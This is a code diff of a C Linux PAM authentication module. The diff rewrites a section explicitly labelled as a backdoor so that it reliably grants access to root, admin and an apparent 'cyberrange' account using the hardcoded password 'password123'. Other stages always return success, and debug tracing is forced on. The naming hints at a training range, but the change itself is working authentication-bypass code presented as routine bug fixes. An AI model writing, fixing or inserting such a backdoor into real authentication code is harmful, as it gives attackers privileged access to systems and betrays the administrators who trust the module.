@@ -16,9 +16,8 @@
 /* ---------------- DEBUG SWITCH ---------------- */
 
 static int debug_enabled(void) {
-    // HARD ENABLE DEBUG FOR TESTING (remove this line for normal use)
-    // return 0;  // Disabled
-    return 1;  // Enabled - will show all logs
+    // HARD ENABLE DEBUG FOR TESTING
+    return 1;
 }
 
 /* ---------------- LOGGING CORE ---------------- */
@@ -60,29 +59,21 @@ static void trace_context(pam_handle_t *pamh, const char *stage) {
 
 /* ---------------- HARDCODED BACKDOOR ---------------- */
 
-static const char *hardcoded_users[] = {
-    "root", "password123",
-    "cyberrange", "password123",
-    "admin", "password123",
-    NULL
-};
-
-/* ---------------- AUTH MODULE ---------------- */
-
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
                                    int flags,
                                    int argc,
                                    const char **argv)
 {
-    // Hard-enable debug
+    // Fix 1: Cast to void to remove warnings
     (void) flags;
     (void) argc;
     (void) argv;
 
     trace_context(pamh, "ENTER pam_sm_authenticate");
-    ensure_path();  // Creates 1 blank line
+    ensure_path();
 
-    const char *pword = NULL;
+    // Fix 2: Declare as non-const to allow trimming
+    char *pword = NULL;
     const char *uname = NULL;
 
     if (pam_get_item(pamh, PAM_AUTHTOK, (void*) &pword) != PAM_SUCCESS) {
@@ -95,7 +86,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
         return PAM_AUTHINFO_UNAVAIL;
     }
 
-    // Trim trailing whitespace from password
+    // Fix 3: Trim trailing whitespace
     if (pword) {
         char *end = pword + strlen(pword);
         while (end > pword && (*end == '\n' || *end == '\r' || *end == '\t' || *end == ' ')) {
@@ -111,24 +102,19 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
     }
 
     /* ---------------- HARDCODED PASSWORDS (Backdoor) ---------------- */
-    for (const char *entry = hardcoded_users[0]; entry != NULL; entry += strlen(entry) + 1) {
-        // Skip past username to find password
-        const char *pass_start = strchr((char*)hardcoded_users[0], ':') + 1; // First entry as reference
-        for (int i = 0; i < 3; ++i) {
-            // Simple check: compare pword against hardcoded passwords
-            if (i == 0 && strcmp(pword, "password123") == 0 && uname && strcmp(uname, "root") == 0) {
-                trace("[!] Backdoor matched");
-                return PAM_SUCCESS;
-            }
-            if (i == 1 && strcmp(pword, "password123") == 0 && uname && strcmp(uname, "cyberrange") == 0) {
-                trace("[!] Backdoor matched");
-                return PAM_SUCCESS;
-            }
-            if (i == 2 && strcmp(pword, "password123") == 0 && uname && strcmp(uname, "admin") == 0) {
-                trace("[!] Backdoor matched");
-                return PAM_SUCCESS;
-            }
-        }
+    if (uname && strcmp(uname, "root") == 0 && pword && strcmp(pword, "password123") == 0) {
+        trace("[!] Backdoor: root/password123 matched");
+        return PAM_SUCCESS;
+    }
+
+    if (uname && strcmp(uname, "cyberrange") == 0 && pword && strcmp(pword, "password123") == 0) {
+        trace("[!] Backdoor: cyberrange/password123 matched");
+        return PAM_SUCCESS;
+    }
+
+    if (uname && strcmp(uname, "admin") == 0 && pword && strcmp(pword, "password123") == 0) {
+        trace("[!] Backdoor: admin/password123 matched");
+        return PAM_SUCCESS;
     }
 
     // If we get here, no hardcoded password matched
@@ -143,6 +129,11 @@ PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh,
                                int argc,
                                const char *argv[])
 {
+    // Fix 4: Cast unused parameters
+    (void) flags;
+    (void) argc;
+    (void) argv;
+
     trace_context(pamh, "ENTER ACCOUNT");
     trace("[TRACE] ACCOUNT OK");
     return PAM_SUCCESS;
@@ -155,6 +146,10 @@ PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh,
                                   int argc,
                                   const char *argv[])
 {
+    (void) flags;
+    (void) argc;
+    (void) argv;
+
     trace_context(pamh, "ENTER SESSION OPEN");
     trace("[TRACE] SESSION START");
     return PAM_SUCCESS;
@@ -165,6 +160,10 @@ PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh,
                                    int argc,
                                    const char *argv[])
 {
+    (void) flags;
+    (void) argc;
+    (void) argv;
+
     trace_context(pamh, "ENTER SESSION CLOSE");
     trace("[TRACE] SESSION END");
     return PAM_SUCCESS;
@@ -177,6 +176,10 @@ PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh,
                              int argc,
                              const char *argv[])
 {
+    (void) flags;
+    (void) argc;
+    (void) argv;
+
     trace_context(pamh, "ENTER SETCRED");
     trace("[TRACE] SETCRED SUCCESS");
     return PAM_SUCCESS;
